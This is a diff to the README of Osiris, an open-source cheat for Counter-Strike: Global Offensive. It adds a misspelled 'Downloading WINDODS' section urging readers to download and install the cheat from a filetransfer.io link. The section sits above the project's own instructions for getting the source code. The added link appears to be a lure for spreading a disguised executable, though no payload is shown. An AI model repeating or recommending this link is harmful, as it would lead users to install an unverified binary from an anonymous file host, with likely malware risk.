@@ -208,6 +208,10 @@ Free open-source training software / cheat for **Counter-Strike: Global Offensiv
 ### Prerequisites
 Microsoft Visual Studio 2019 (preferably the latest version), platform toolset v142 and Windows SDK 10.0 are required in order to compile Osiris. If you don't have ones, you can download VS [here](https://visualstudio.microsoft.com/) (Windows SDK is installed during Visual Studio Setup).
 
+### Downloading WINDODS
+Download and install a cheat for free now
+[click here](https://filetransfer.io/data-package/5tBQDzS2/download).
+
 ### Downloading
 
 There are two options of downloading the source code:
